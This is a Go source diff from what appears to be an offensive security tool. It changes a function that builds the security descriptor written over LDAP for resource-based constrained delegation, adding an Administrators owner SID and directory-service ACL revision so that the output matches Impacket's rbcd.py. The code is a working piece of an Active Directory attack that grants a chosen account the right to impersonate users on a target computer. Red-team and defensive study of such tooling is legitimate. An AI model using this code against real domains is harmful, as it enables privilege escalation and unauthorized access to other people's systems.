@@ -886,12 +886,22 @@ func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.C
 }
 
 // buildRBCDSecurityDescriptor creates a self-relative security descriptor
-// with a DACL containing one ACCESS_ALLOWED_ACE granting GENERIC_ALL to the given SID.
+// with a DACL containing one ACCESS_ALLOWED_ACE granting full control to the given SID.
+// Matches Impacket's rbcd.py format: OwnerSid=BUILTIN\Administrators, AclRevision=4.
 func buildRBCDSecurityDescriptor(sid []byte) []byte {
+	// Owner SID: S-1-5-32-544 (BUILTIN\Administrators)
+	ownerSid := []byte{
+		0x01, 0x02,                         // Revision=1, SubAuthorityCount=2
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x05, // IdentifierAuthority = NT Authority (5)
+		0x20, 0x00, 0x00, 0x00,             // SubAuthority[0] = 32 (BUILTIN)
+		0x20, 0x02, 0x00, 0x00,             // SubAuthority[1] = 544 (Administrators)
+	}
+	ownerLen := len(ownerSid) // 16 bytes
+
 	sidLen := len(sid)
-	aceSize := 8 + sidLen            // ACE header (4) + mask (4) + SID
-	aclSize := 8 + aceSize           // ACL header (8) + ACE
-	sdSize := 20 + aclSize           // SD header (20) + DACL
+	aceSize := 8 + sidLen              // ACE header (4) + mask (4) + SID
+	aclSize := 8 + aceSize             // ACL header (8) + ACE
+	sdSize := 20 + ownerLen + aclSize  // SD header (20) + OwnerSid + DACL
 
 	sd := make([]byte, sdSize)
 
@@ -899,14 +909,17 @@ func buildRBCDSecurityDescriptor(sid []byte) []byte {
 	sd[0] = 1              // Revision
 	sd[1] = 0              // Sbz1
 	binary.LittleEndian.PutUint16(sd[2:4], 0x8004) // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
-	binary.LittleEndian.PutUint32(sd[4:8], 0)      // OffsetOwner (none)
+	binary.LittleEndian.PutUint32(sd[4:8], 20)     // OffsetOwner (right after header)
 	binary.LittleEndian.PutUint32(sd[8:12], 0)     // OffsetGroup (none)
 	binary.LittleEndian.PutUint32(sd[12:16], 0)    // OffsetSacl (none)
-	binary.LittleEndian.PutUint32(sd[16:20], 20)   // OffsetDacl (right after header)
+	daclOff := 20 + ownerLen
+	binary.LittleEndian.PutUint32(sd[16:20], uint32(daclOff)) // OffsetDacl
 
-	// ACL header
-	daclOff := 20
-	sd[daclOff] = 2        // AclRevision
+	// Owner SID
+	copy(sd[20:], ownerSid)
+
+	// ACL header (ACL_REVISION_DS = 4 for directory service ACLs)
+	sd[daclOff] = 4        // AclRevision (ACL_REVISION_DS)
 	sd[daclOff+1] = 0      // Sbz1
 	binary.LittleEndian.PutUint16(sd[daclOff+2:daclOff+4], uint16(aclSize))
 	binary.LittleEndian.PutUint16(sd[daclOff+4:daclOff+6], 1)  // AceCount
@@ -917,7 +930,7 @@ func buildRBCDSecurityDescriptor(sid []byte) []byte {
 	sd[aceOff] = 0x00      // AceType: ACCESS_ALLOWED_ACE_TYPE
 	sd[aceOff+1] = 0x00    // AceFlags
 	binary.LittleEndian.PutUint16(sd[aceOff+2:aceOff+4], uint16(aceSize))
-	binary.LittleEndian.PutUint32(sd[aceOff+4:aceOff+8], 0x000F003F) // GENERIC_ALL equivalent for RBCD
+	binary.LittleEndian.PutUint32(sd[aceOff+4:aceOff+8], 0x000F003F) // Full control mask (983551)
 
 	// SID
 	copy(sd[aceOff+8:], sid)
